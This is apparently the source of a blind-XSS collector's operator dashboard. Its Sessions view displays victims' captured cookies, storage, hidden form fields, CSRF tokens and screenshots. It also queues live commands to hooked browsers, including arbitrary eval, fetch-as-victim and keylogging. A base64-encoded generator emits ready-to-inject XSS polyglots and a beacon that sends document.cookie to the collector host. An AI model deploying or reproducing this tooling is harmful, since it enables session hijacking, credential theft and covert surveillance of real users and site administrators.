// Operator dashboard, served from GET / (auth-gated by ?key=AUTH_KEY).
// Two views: live Sessions (captures + interactive commands) and a Payload
// Generator that mints a unique token per injection point and emits ready-to-
// inject payloads for every context, plus a local token->surface registry.
export const DASHBOARD = `<!doctype html><meta charset=utf-8><title>bxss · collector</title>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=icon type=image/svg+xml href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iNyIgZmlsbD0iIzBhMGMxMCIvPjxjaXJjbGUgY3g9IjE2IiBjeT0iMTYiIHI9IjkiIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzRjOWZmZiIgc3Ryb2tlLXdpZHRoPSIyIi8+PGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMi42IiBmaWxsPSIjM2ZiOTUwIi8+PHBhdGggZD0iTTE2IDIuNXY1LjVNMTYgMjR2NS41TTIuNSAxNkg4TTI0IDE2aDUuNSIgc3Ryb2tlPSIjNGM5ZmZmIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIvPjwvc3ZnPg==">
<style>
 :root{
  --bg:#08090b;--panel:#0f1115;--panel2:#0b0d10;--line:#20242c;--line2:#16191f;
  --fg:#d5dae1;--dim:#7d8590;--accent:#4c9fff;--green:#3fb950;--good:#56d364;
  --warn:#d29922;--pink:#ff7b72;--radius:8px
 }
 *{box-sizing:border-box}
 body{font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;margin:0;background:var(--bg);color:var(--fg)}
 header{display:flex;align-items:center;gap:14px;padding:0 16px;height:50px;background:linear-gradient(180deg,#0f1115,#0b0d10);border-bottom:1px solid var(--line)}
 .brand{display:flex;align-items:center;gap:9px;font-weight:700;color:var(--fg);letter-spacing:.2px}
 .brand svg{display:block;flex:none}
 .brand .lo{color:var(--dim);font-weight:400;font-size:11px;letter-spacing:1.5px;text-transform:uppercase}
 .tabs{display:flex;gap:4px;margin-left:8px}
 .tab{padding:6px 14px;border:1px solid transparent;border-radius:var(--radius);cursor:pointer;color:var(--dim);background:none}
 .tab:hover{color:var(--fg);background:var(--panel2)}
 .tab.on{color:var(--fg);background:var(--panel2);border-color:var(--line)}
 .pill{margin-left:auto;color:var(--dim);font-size:12px}
 .pill b{color:var(--good)}
 .dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#484f58;vertical-align:middle;margin-right:6px}
 .dot.live{background:var(--green);box-shadow:0 0 0 0 rgba(63,185,80,.6);animation:pulse 2s infinite}
 @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(63,185,80,.5)}70%{box-shadow:0 0 0 6px rgba(63,185,80,0)}100%{box-shadow:0 0 0 0 rgba(63,185,80,0)}}

 /* ---- sessions view ---- */
 #sessions{display:grid;grid-template-columns:340px 1fr;height:calc(100vh - 48px)}
 #side{display:flex;flex-direction:column;border-right:1px solid var(--line);min-height:0}
 #search{margin:10px;padding:7px 10px;background:var(--panel2);color:var(--fg);border:1px solid var(--line);border-radius:var(--radius)}
 #list{overflow:auto;flex:1}
 .s{position:relative;padding:10px 34px 10px 14px;border-bottom:1px solid var(--line2);cursor:pointer;border-left:3px solid transparent}
 .s:hover{background:var(--panel)}
 .s.sel{background:var(--panel);border-left-color:var(--accent)}
 .s .del{position:absolute;top:8px;right:8px;width:20px;height:20px;line-height:1;padding:0;border:1px solid var(--line);background:var(--panel2);color:var(--dim);border-radius:5px;cursor:pointer;opacity:0;font-size:14px}
 .s:hover .del{opacity:1}
 .s .del:hover{border-color:var(--pink);color:var(--pink)}
 .s .tok{display:inline-block;background:#1f6feb22;color:var(--accent);border:1px solid #1f6feb55;border-radius:5px;padding:1px 7px;font-size:11px;font-weight:600}
 .s .u{color:var(--fg);margin:5px 0 3px;word-break:break-all}
 .s .m{color:var(--dim);font-size:11px}
 #detail{overflow:auto;padding:16px 20px}
 .empty{color:var(--dim);padding:40px;text-align:center}
 .card{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:0;margin:0 0 14px;overflow:hidden}
 .card>.hd{display:flex;align-items:center;gap:8px;padding:8px 12px;background:var(--panel2);border-bottom:1px solid var(--line);color:var(--good);font-weight:600}
 .card>.hd .g{color:var(--dim);font-weight:400;margin-left:auto;font-size:11px}
 pre{white-space:pre-wrap;word-break:break-all;margin:0;padding:10px 12px;max-height:42vh;overflow:auto;color:var(--fg)}
 .kv{display:grid;grid-template-columns:auto 1fr;gap:2px 14px;padding:10px 12px}
 .kv .k{color:var(--dim)}
 img.shot{max-width:100%;border-top:1px solid var(--line);display:block}
 .btn{font:inherit;background:var(--panel2);color:var(--fg);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer}
 .btn:hover{border-color:var(--accent);color:var(--fg)}
 .btn.mini{padding:2px 8px;font-size:11px}
 .quick{display:flex;flex-wrap:wrap;gap:6px;padding:10px 12px}
 .cmd{display:flex;gap:6px;padding:0 12px 12px}
 .cmd input{flex:1;background:var(--panel2);color:var(--fg);border:1px solid var(--line);border-radius:6px;padding:6px 8px;font:inherit}

 /* ---- generator view ---- */
 #gen{display:none;max-width:920px;margin:0 auto;padding:22px 20px}
 #gen.on{display:block}
 #sessions.off{display:none}
 .row{display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end;margin-bottom:14px}
 .fld{display:flex;flex-direction:column;gap:5px}
 .fld label{color:var(--dim);font-size:11px}
 .fld input{background:var(--panel2);color:var(--fg);border:1px solid var(--line);border-radius:6px;padding:7px 10px;font:inherit;min-width:220px}
 .fld.grow{flex:1}.fld.grow input{width:100%;min-width:0}
 .btn.go{background:#238636;border-color:#2ea043;color:#fff;padding:8px 18px;font-weight:600}
 .btn.go:hover{background:#2ea043}
 .out .pl{display:flex;align-items:center;gap:8px;padding:7px 10px;border-bottom:1px solid var(--line2)}
 .out .pl code{flex:1;color:var(--fg);word-break:break-all;font-size:12px}
 .out .grouphd{padding:8px 12px;background:var(--panel2);color:var(--good);font-weight:600;border-top:1px solid var(--line)}
 .tokline{display:flex;align-items:center;gap:10px;background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:12px 14px;margin-bottom:14px}
 .tokline .big{font-size:16px;font-weight:700;color:var(--accent)}
 .reg{width:100%;border-collapse:collapse;margin-top:8px}
 .reg th,.reg td{text-align:left;padding:6px 10px;border-bottom:1px solid var(--line2);font-size:12px}
 .reg th{color:var(--dim);font-weight:600}
 .reg td .tok{color:var(--accent)}
 .muted{color:var(--dim)}
 h2{font-size:13px;color:var(--good);margin:22px 0 8px;border-bottom:1px solid var(--line);padding-bottom:6px}
 #toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(20px);background:#238636;color:#fff;padding:8px 18px;border-radius:20px;opacity:0;transition:.25s;pointer-events:none}
 #toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
</style>
<header>
 <div class=brand>
  <svg width=22 height=22 viewBox="0 0 32 32"><circle cx=16 cy=16 r=9 fill=none stroke="#4c9fff" stroke-width=2></circle><circle cx=16 cy=16 r=2.6 fill="#3fb950"></circle><path d="M16 2.5v5.5M16 24v5.5M2.5 16H8M24 16h5.5" stroke="#4c9fff" stroke-width=2 stroke-linecap=round></path></svg>
  blind-xss-collector <span class=lo>collector</span>
 </div>
 <div class=tabs>
  <div class=tab id=tab-sessions onclick="tab('sessions')">Sessions</div>
  <div class=tab id=tab-gen onclick="tab('gen')">Payload Generator</div>
 </div>
 <div class=pill><span class=dot id=beat></span><b id=count>0</b> sessions</div>
</header>

<div id=sessions>
 <div id=side>
  <input id=search placeholder="filter token / url / ip" oninput="filter=this.value;renderList()">
  <div id=list></div>
 </div>
 <div id=detail><div class=empty>select a session on the left</div></div>
</div>

<div id=gen>
 <h2>unique probe URL &amp; payload generator</h2>
 <div class=row>
  <div class=fld><label>injection-point label</label><input id=g-label placeholder="e.g. support-form" oninput="if(event.key)null"></div>
  <div class=fld grow class="fld grow"><label>collector host</label><input id=g-host></div>
  <button class="btn go" onclick="generate()">Generate</button>
 </div>
 <div id=g-out></div>
 <h2>token registry (this browser) — map each token to its surface</h2>
 <div id=g-reg><div class=muted>no tokens generated yet</div></div>
</div>

<div id=toast></div>
<script>
const key=new URLSearchParams(location.search).get('key')||'';
const q=p=>fetch(p+(p.includes('?')?'&':'?')+'key='+encodeURIComponent(key)).then(r=>r.json());
function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
function toast(m){var t=document.getElementById('toast');t.textContent=m;t.className='show';setTimeout(()=>t.className='',1300)}
function copy(txt){navigator.clipboard.writeText(txt).then(()=>toast('copied')).catch(()=>toast('copy failed'))}

/* ---------------- tabs ---------------- */
function tab(name){
  document.getElementById('tab-sessions').className='tab'+(name==='sessions'?' on':'');
  document.getElementById('tab-gen').className='tab'+(name==='gen'?' on':'');
  document.getElementById('sessions').className=(name==='sessions'?'':'off');
  document.getElementById('gen').className=(name==='gen'?'on':'');
}
tab('sessions');

/* ---------------- sessions ---------------- */
let cur=null, filter='', all=[], curRep={};
const LIVE=30000;
async function refresh(){
  all=await q('/api/sessions');
  document.getElementById('count').textContent=all.length;
  var live=all.some(s=>Date.now()-s.last_seen<LIVE);
  document.getElementById('beat').className='dot'+(live?' live':'');
  renderList();
}
function renderList(){
  var f=filter.toLowerCase();
  var rows=all.filter(s=>!f||((s.token||'')+(s.url||'')+(s.ip||'')).toLowerCase().includes(f));
  document.getElementById('list').innerHTML=rows.map(s=>{
    var on=Date.now()-s.last_seen<LIVE;
    return '<div class="s'+(s.sid===cur?' sel':'')+'" onclick="open_(\\''+s.sid+'\\')">'+
      '<button class=del title="delete session" onclick="event.stopPropagation();delSession(\\''+s.sid+'\\')">&times;</button>'+
      '<span class=dot'+(on?' live':'')+'></span><span class=tok>'+esc(s.token)+'</span>'+
      '<div class=u>'+esc(s.url||'(no url)')+'</div>'+
      '<div class=m>'+new Date(s.last_seen).toLocaleString()+' · '+esc(s.ip||'')+'</div></div>';
  }).join('')||'<div class=empty>no sessions'+(f?' match filter':' yet')+'</div>';
}
async function delSession(sid){
  if(!confirm('Delete this session and all its captured data?'))return;
  await fetch('/api/delete?key='+encodeURIComponent(key),{method:'POST',body:JSON.stringify({sid:sid})});
  if(cur===sid){cur=null;document.getElementById('detail').innerHTML='<div class=empty>select a session on the left</div>';}
  toast('session deleted');refresh();
}
function card(title,body,extra){return '<div class=card><div class=hd>'+title+(extra||'')+'</div>'+body+'</div>'}
function copyField(k){copy(curRep[k]==null?'':String(curRep[k]))}
async function open_(sid){
  cur=sid;renderList();
  const [reps,cmds]=await Promise.all([q('/api/reports?sid='+sid),q('/api/cmdresults?sid='+sid)]);
  const r=reps[0]||{};curRep=r;
  var cpy=k=>'<button class="btn mini" onclick="copyField(\\''+k+'\\')">copy</button>';
  var shot=r.screenshot?'<img class=shot src="'+esc(r.screenshot)+'">':'';
  var html=
    card('fired at','<div class=kv><span class=k>url</span><span>'+esc(r.url)+'</span>'+
       '<span class=k>title</span><span>'+esc(r.title)+'</span>'+
       '<span class=k>origin</span><span>'+esc(r.origin)+'</span>'+
       '<span class=k>referrer</span><span>'+esc(r.referrer)+'</span>'+
       '<span class=k>seen</span><span>'+(r.ts?new Date(r.ts).toLocaleString():'')+'</span></div>')+
    card('victim','<div class=kv><span class=k>ip</span><span>'+esc(r.ip)+'</span>'+
       '<span class=k>ua</span><span>'+esc(r.ua)+'</span></div>')+
    card('cookies','<pre>'+esc(r.cookies)+'</pre>',cpy('cookies'))+
    card('storage','<pre>'+esc(r.storage)+'</pre>',cpy('storage'))+
    card('forms / hidden inputs','<pre>'+esc(r.forms)+'</pre>',cpy('forms'))+
    card('meta / csrf','<pre>'+esc(r.meta)+'</pre>',cpy('meta'))+
    card('interactive — tab must still be open',
      '<div class=quick>'+
        '<button class=btn onclick="send(\\'dom\\')">dom</button>'+
        '<button class=btn onclick="send(\\'cookies\\')">cookies</button>'+
        '<button class=btn onclick="send(\\'storage\\')">storage</button>'+
        '<button class=btn onclick="send(\\'screenshot\\')">screenshot</button>'+
        '<button class=btn onclick="var u=prompt(\\'same-origin URL to fetch as victim\\');if(u)send(\\'fetch:\\'+u)">fetch-as-victim</button>'+
        '<button class=btn onclick="var s=prompt(\\'selector to keylog (blank=all)\\');send(\\'keylog:\\'+(s||\\'\\'))">keylog</button>'+
      '</div>'+
      '<div class=cmd><input id=ci placeholder="eval:document.domain  |  fetch:/admin  |  dom"><button class=btn onclick="send()">run</button></div>')+
    card('command results','<pre>'+(cmds.length?cmds.map(c=>'['+c.status+'] '+esc(c.cmd)+'\\n'+esc(c.result||'(pending)')).join('\\n\\n'):'(none)')+'</pre>')+
    card('DOM snapshot','<pre>'+esc(r.dom)+'</pre>'+shot,cpy('dom'));
  document.getElementById('detail').innerHTML=html;
}
async function send(cmd){
  cmd=cmd||document.getElementById('ci').value;if(!cmd||!cur)return;
  await fetch('/api/cmd?key='+encodeURIComponent(key),{method:'POST',body:JSON.stringify({sid:cur,cmd})});
  toast('queued');setTimeout(()=>open_(cur),1500);
}

/* ---------------- payload generator ---------------- */
document.getElementById('g-host').value=location.origin;
// payload templates (base64 JSON) — decoded at runtime so polyglot backticks/
// backslashes/close-tags need no escaping in this inline script. HOST/TOKEN
// are substituted at render.
var TPL=JSON.parse(decodeURIComponent(escape(atob('W1siUG9seWdsb3Qg4oCUIG9uZSBwYXlsb2FkIGZvciBBTlkgaW5wdXQgKGNvbWJpbmVzIEhUTUwgKyBKUy1jb250ZXh0IGJyZWFrL2ZpeCkiLFsiXCI+Jz48L3RleHRhcmVhPjwvdGl0bGU+PC9zdHlsZT48L3NjcmlwdD48c3ZnIG9ubG9hZD1pbXBvcnQoJy8vSE9TVC9jL1RPS0VOJyk+PGltZyBzcmMgb25lcnJvcj1pbXBvcnQoJy8vSE9TVC9jL1RPS0VOJyk+PHNjcmlwdCBzcmM9Ly9IT1NUL2MvVE9LRU4+PC9zY3JpcHQ+IiwiamFWYXNDcmlwdDovKi0vKmAvKlxcYC8qJy8qXCIvKiovKC8qICovb05jbGlDaz1pbXBvcnQoJy8vSE9TVC9jL1RPS0VOJykgKS8vJTBEJTBBJTBEJTBBLy88L3N0WWxlLzwvdGl0TGUvPC90ZVh0YXJFYS88L3NjUmlwdC8tLSE+XFx4M2NzVmcvPHNWZy9vTmxvQWQ9aW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpLy8+XFx4M2UiLCInO2ltcG9ydCgnLy9IT1NUL2MvVE9LRU4nKTsvLyIsIictaW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpLSciXV0sWyJFeHRlcm5hbCBzY3JpcHQgKG5lZWRzIHNjcmlwdC1zcmMgdG8gYWxsb3cgSE9TVCBvciBiZSBhYnNlbnQpIixbIlwiPjxzY3JpcHQgc3JjPS8vSE9TVC9jL1RPS0VOPjwvc2NyaXB0PiIsIic+PHNjcmlwdCBzcmM9Ly9IT1NUL2MvVE9LRU4+PC9zY3JpcHQ+IiwiPC90ZXh0YXJlYT48c2NyaXB0IHNyYz0vL0hPU1QvYy9UT0tFTj48L3NjcmlwdD4iLCI8L3RpdGxlPjxzY3JpcHQgc3JjPS8vSE9TVC9jL1RPS0VOPjwvc2NyaXB0PiIsIjxzY3JpcHQgc3JjPS8vSE9TVC9jL1RPS0VOPjwvc2NyaXB0PiJdXSxbIkF0dHJpYnV0ZSAvIGV2ZW50LWhhbmRsZXIgYnJlYWtvdXQgKG5vIHNjcmlwdCB0YWcpIixbIlwiIG9ubW91c2VvdmVyPVwiaW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpXCIgeD1cIiIsIlwiIG9uZm9jdXM9XCJpbXBvcnQoJy8vSE9TVC9jL1RPS0VOJylcIiBhdXRvZm9jdXMgeD1cIiIsIlwiPjxpbWcgc3JjPXggb25lcnJvcj1cImltcG9ydCgnLy9IT1NUL2MvVE9LRU4nKVwiPiIsIlwiPjxzdmcgb25sb2FkPVwiaW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpXCI+IiwiamF2YXNjcmlwdDppbXBvcnQoJy8vSE9TVC9jL1RPS0VOJykiXV0sWyJNYXJrdXAtaW5qZWN0aW9uIC8gbm8tSlMtY29udGV4dCBzaW5rIixbIjxpZnJhbWUgc3JjZG9jPVwiJmx0O3NjcmlwdCBzcmM9Ly9IT1NUL2MvVE9LRU4mZ3Q7Jmx0Oy9zY3JpcHQmZ3Q7XCI+PC9pZnJhbWU+IiwiPHN2Zz48YW5pbWF0ZSBvbmJlZ2luPVwiaW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpXCIgYXR0cmlidXRlTmFtZT14IGR1cj0xcz4iLCI8b2JqZWN0IGRhdGE9XCIvL0hPU1QvYy9UT0tFTlwiPjwvb2JqZWN0PiJdXSxbIlN0cmljdC1DU1AgZGVncmFkZWQgYmVhY29uIChpbWctc3JjIGZhbGxiYWNrLCBjb25maXJtcyBmaXJlICsgbGVha3MgY29va2llKSIsWyJcIj48c2NyaXB0Pm5ldyBJbWFnZSgpLnNyYz0nLy9IT1NUL3AvVE9LRU4/Zj1yJnM9aW5saW5lJmk9MCZuPTEmZD0nK2J0b2EobG9jYXRpb24rJyAnK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4iXV1d'))));
var genOut=[];  // flat list of currently-rendered payload strings, copied by index
function slug(s){return String(s||'').toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-+|-+$/g,'').slice(0,24)}
function rand(){return Math.random().toString(16).slice(2,8)}
function regGet(){try{return JSON.parse(localStorage.getItem('bxss_tokens')||'[]')}catch(e){return[]}}
function regSet(a){localStorage.setItem('bxss_tokens',JSON.stringify(a.slice(0,100)))}
function generate(){
  var label=document.getElementById('g-label').value.trim();
  var host=document.getElementById('g-host').value.trim().replace(/^https?:\\/\\//,'').replace(/\\/+$/,'');
  if(!host){toast('set a host');return}
  var token='t-'+(slug(label)?slug(label)+'-':'')+rand();
  genOut=[];
  var probe='https://'+host+'/c/'+token;
  var out='<div class=tokline><div><div class=muted>unique token</div><div class=big>'+esc(token)+'</div></div>'+
    '<div style="flex:1"><div class=muted>probe url</div><code>'+esc(probe)+'</code></div>'+
    '<button class="btn mini" onclick="copy(\\''+probe+'\\')">copy url</button></div>';
  out+='<div class="card out">';
  TPL.forEach(function(grp){
    out+='<div class=grouphd>'+esc(grp[0])+'</div>';
    grp[1].forEach(function(t){
      var p=t.split('HOST').join(host).split('TOKEN').join(token);
      var i=genOut.push(p)-1;
      out+='<div class=pl><code>'+esc(p)+'</code><button class="btn mini" onclick="copyGen('+i+')">copy</button></div>';
    });
  });
  out+='</div>';
  document.getElementById('g-out').innerHTML=out;
  var reg=regGet();
  reg.unshift({token:token,label:label||'(unlabeled)',host:host,ts:Date.now()});
  regSet(reg);renderReg();
}
function copyGen(i){copy(genOut[i])}
function delReg(tok){regSet(regGet().filter(function(x){return x.token!==tok}));renderReg()}
function renderReg(){
  var reg=regGet();
  if(!reg.length){document.getElementById('g-reg').innerHTML='<div class=muted>no tokens generated yet</div>';return}
  document.getElementById('g-reg').innerHTML='<table class=reg><tr><th>token</th><th>surface / label</th><th>host</th><th>created</th><th></th></tr>'+
    reg.map(function(x){return '<tr><td class=tok>'+esc(x.token)+'</td><td>'+esc(x.label)+'</td><td>'+esc(x.host)+
      '</td><td class=muted>'+new Date(x.ts).toLocaleString()+'</td>'+
      '<td><button class="btn mini" onclick="delReg(\\''+x.token+'\\')">del</button></td></tr>'}).join('')+'</table>';
}
renderReg();
document.getElementById('g-label').addEventListener('keydown',function(e){if(e.key==='Enter')generate()});

refresh();setInterval(refresh,4000);
</script>`;
